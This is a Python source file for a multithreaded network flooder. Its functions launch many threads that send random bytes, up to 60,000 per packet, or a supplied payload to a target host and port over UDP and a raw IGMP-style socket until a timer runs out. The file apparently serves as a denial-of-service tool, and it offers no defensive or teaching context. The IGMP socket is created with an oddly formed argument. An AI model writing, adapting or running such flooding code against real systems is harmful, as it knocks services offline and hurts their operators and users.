import socket
import threading
import random
import datetime

def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except Exception as e:
            print(f"Error starting flooder thread: {e}")
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    try:
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                sock.sendto(rand, (host, int(port)))
            except Exception as e:
                print(f"Error sending flood: {e}")
                pass
    finally:
        sock.close()  # 항상 소켓을 닫습니다.

def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except Exception as e:
            print(f"Error starting sender thread: {e}")
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                sock.sendto(payload, (host, int(port)))
            except Exception as e:
                print(f"Error sending payload: {e}")
                pass
    finally:
        sock.close()  # 항상 소켓을 닫습니다.
